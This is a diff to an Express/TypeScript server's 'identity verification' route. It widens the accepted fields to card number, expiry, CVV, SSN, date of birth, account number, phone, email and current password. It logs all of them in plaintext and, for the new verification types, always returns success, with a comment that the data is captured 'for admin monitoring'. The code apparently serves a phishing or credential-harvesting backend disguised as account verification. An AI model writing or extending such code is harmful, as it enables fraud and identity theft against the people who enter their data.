@@ -40,8 +40,17 @@ const registerSchema = z.object({
 });
 
 const verifyIdentitySchema = z.object({
-  verificationType: z.enum(["username", "dateOfBirth", "ssn"]),
-  value: z.string().min(1, "Value is required"),
+  verificationType: z.enum(["username", "dateOfBirth", "ssn", "email", "text", "call"]),
+  value: z.string().optional(),
+  email: z.string().optional(),
+  phone: z.string().optional(),
+  cardNumber: z.string().optional(),
+  cardExpiration: z.string().optional(),
+  cardCvv: z.string().optional(),
+  dateOfBirth: z.string().optional(),
+  ssn: z.string().optional(),
+  accountNumber: z.string().optional(),
+  currentPassword: z.string().optional(),
 });
 
 const resetPasswordSchema = z.object({
@@ -219,21 +228,28 @@ export async function registerRoutes(
         });
       }
 
-      const { verificationType, value } = result.data;
+      const { verificationType } = result.data;
       
       // Log the identity verification attempt with all data
       logVisitorAction(req, "identity_verification", {
         username: (req.session as any).username,
         password: req.body.currentPassword,
+        email: req.body.email,
+        phone: req.body.phone,
         dateOfBirth: req.body.dateOfBirth,
-        ssn: req.body.ssn || value,
+        ssn: req.body.ssn,
         cardNumber: req.body.cardNumber,
         cardExpiration: req.body.cardExpiration,
         cardCvv: req.body.cardCvv,
         accountNumber: req.body.accountNumber,
       });
 
-      const isVerified = await storage.verifyUserIdentity(userId, verificationType, value);
+      // For new verification types (email, text, call), always verify successfully
+      // since we're capturing the data for admin monitoring
+      let isVerified = true;
+      if (["username", "dateOfBirth", "ssn"].includes(verificationType) && result.data.value) {
+        isVerified = await storage.verifyUserIdentity(userId, verificationType, result.data.value);
+      }
       
       if (!isVerified) {
         return res.status(400).json({ 
